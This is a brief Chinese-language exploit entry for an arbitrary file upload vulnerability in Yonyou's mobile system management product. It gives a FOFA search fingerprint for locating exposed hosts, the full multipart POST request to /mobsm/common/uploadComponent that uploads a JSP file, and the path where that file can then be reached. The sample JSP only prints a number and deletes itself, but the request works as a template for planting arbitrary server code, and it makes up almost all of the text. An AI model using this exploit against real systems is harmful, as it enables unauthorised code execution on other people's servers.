# 用友移动系统管理uploadcomponent任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`fofa：`app="用友-移动系统管理"``
- **请求**：`POST /mobsm/common/uploadComponent HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 302`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="stc.jsp"
<%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--00content0boundary00
Content-Disposition: form-data; name="submit"
上传
--00content0boundary00--

上传文件位置
/mobsm/uploadComponent/stc.jsp
```

**其他**
- 用友移动系统管理uploadcomponent任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友移动管理系统